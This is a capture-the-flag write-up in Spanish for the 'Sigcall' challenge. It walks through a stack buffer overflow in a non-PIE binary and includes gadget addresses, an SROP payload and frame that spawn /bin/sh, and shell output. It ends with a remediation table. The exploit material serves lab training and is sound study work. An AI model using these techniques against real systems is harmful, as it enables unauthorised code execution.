# Resolución — ANCI "Sigcall"

**Flag:** `flag{ejemplo}`
**Servicio:** `nc <host> 28807`
**Estado:** ✅ Resuelto — 2026-10-29
**Severidad:** Crítica (desbordamiento de pila → RCE, usuario `ctf`)
**Artefacto provisto:** `rop.txt` (listado de gadgets)

---

## 1. Reconocimiento del servicio

```
$ nc <host> 28807
gimme:
<dato>
\n                      <- y cierra
```

- Banner `gimme:\n`; lee una vez del socket y termina; sin eco.
- Entradas de ≥140 bytes provocan que el propio wrapper lo reporte por el socket:

```
/home/ctf/run: line 2: <pid> Segmentation fault (core dumped) ./vuln
```

`run` (descargado del contenedor):

```bash
#! /bin/bash
cd /home/ctf/ && ./vuln
```

→ binario `vuln`, usuario `ctf`, sin validaciones adicionales.

## 2. Análisis del binario

`vuln` (descargado vía la shell obtenida; ver `download.py`):

| Propiedad | Valor |
|---|---|
| Formato | ELF 64-bit x86-64, `EXEC` (no PIE) |
| NX | Habilitado |
| Canary | **No** |
| RELRO | Partial |
| Base | `0x400000` |

Función `main` (offset `0x4011f5`):

```asm
4011f9: add rsp, -0x80          ; marco de 128 bytes
401239: lea rax, [rip+0xdc4]    ; "gimme:"
401240: mov rdi, rax
401243: call puts/printf
401248: lea rax, [rbp-0x80]     ; buffer de 128 bytes en pila
40124c: mov edx, 0x200          ; <-- lee 512 bytes
401251: mov rsi, rax
401254: mov edi, 0
401259: call read
40125e: mov eax, 0
401263: leave
401264: ret
```

**Vulnerabilidad:** `read(0, buf_128, 0x200)` desborda 384 bytes.
`buf` en `rbp-0x80` ⇒ **offset hasta RIP = 128 + 8 = 136**.

Verificado empíricamente: 136 bytes → salida normal; 137+ → SIGSEGV.

## 3. Gadgets del archivo `rop.txt`

| Gadget | Dirección |
|---|---|
| `pop rax ; nop ; nop ; pop rbp ; ret` | `0x4011a6` |
| `pop rdi ; ret` | `0x4011cf` |
| `pop rsi ; pop r15 ; ret` | `0x4011cd` |
| `pop rdx ; nop ; nop ; pop rbp ; ret` | `0x4011b0` |
| `pop r9 ; nop ; nop ; pop rbp ; ret` | `0x401178` |
| `mov [rdi], r9 ; nop ; nop ; pop rbp ; ret` | `0x401182` |
| `syscall` | `0x401161` |

Detalle relevante verificado en el binario real: en `0x401161` los bytes son
`0f 05 c3`, es decir **`syscall ; ret`** (el listado `rop.txt` no mostraba el
`ret`). Eso habilita también cadenas ROP con syscalls normales.

No existe función "win" ni `system`/`execve` importados: hay que hacer la
llamada al sistema a mano. El nombre del reto y la ausencia de un `syscall; ret`
en el listado apuntan a **SROP** (*sigreturn-oriented programming*).

## 4. Explotación (SROP)

Objetivo: `execve("/bin/sh", NULL, NULL)` con **una sola** llamada a sistema,
fijando todos los registros mediante `rt_sigreturn` (rax = 15).

### 4.1 Escritura de la cadena en memoria

Se usa el gadget de escritura (`mov [rdi], r9`) para depositar `"/bin/sh\0"` en
`0x404028` (final de `.data`, escribible). Para `argv` se usa `0x404078`, zona
`.bss` a cero (`argv = {NULL}`), evitando una segunda escritura y manteniendo el
payload por debajo del límite de 512 bytes del `read`.

### 4.2 Cadena

```python
payload  = b"A" * 136
payload += pop_r9("/bin/sh\0") + pop_rdi(0x404028) + write_qword
payload += pop_rax(15) + p64(0x401161)        # rt_sigreturn
payload += bytes(frame)                        # frame SROP
```

Frame:

```python
frame.rax = 59            # execve
frame.rdi = 0x404028      # "/bin/sh"
frame.rsi = 0x404078      # argv = {NULL}
frame.rdx = 0             # envp = NULL
frame.rip = 0x401161      # syscall
frame.rsp = 0x404800
```

Tamaño total: **472 bytes** (≤ 512 que acepta `read`).

### 4.3 Resultado

```
$ python exploit.py
[*] payload: 472 bytes (limite read = 0x200 = 512)
[*] banner: b'gimme:'
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
flag{ejemplo}
```

## 5. Localización de la flag

La flag **no** está en `/flag.txt`. El reconocimiento dentro del contenedor
(`enum_ctf.py`) mostró:

```
/home/ctf/flag.txt   -r--r----- root ctf   24 bytes
```

Legible por el grupo `ctf` (el usuario del servicio):

```sh
cat /home/ctf/flag.txt
```

## 6. Causa raíz y remediación

| # | Debilidad | CWE | Remediación |
|---|---|---|---|
| 1 | `read()` con longitud 512 sobre buffer de 128 | CWE-121 (stack buffer overflow) | `read(0, buf, sizeof(buf)-1)` |
| 2 | Sin canary ni PIE | CWE-1188 / CWE-693 | Recompilar `-fstack-protector-strong -fPIE -pie`, RELRO completo |
| 3 | Flag accesible por el usuario del servicio | CWE-522 | Secreto fuera del contenedor o permisos restringidos |

## 7. Archivos

| Archivo | Uso |
|---|---|
| `rop.txt` | Artefacto provisto (gadgets) |
| `exploit.py` | Exploit final reproducible (SROP) |
| `srop_shell.py` | Primera versión (payload de 528 B; funcionó por truncamiento del `read`) |
| `enum_ctf.py` | Reconocimiento dentro del contenedor |
| `download.py` | Descarga `vuln` y `run` vía base64 |
| `vuln`, `run.sh` | Binario y wrapper obtenidos del contenedor |
| `probe2.py`, `scan.py`, `candidates.py`, `sigtest.py` | Sondeo black-box inicial (banner, umbral 136, descarte de señales) |

## 8. Autorización

Reto CTF de HackRocks/ANCI. Pruebas limitadas al servicio indicado.
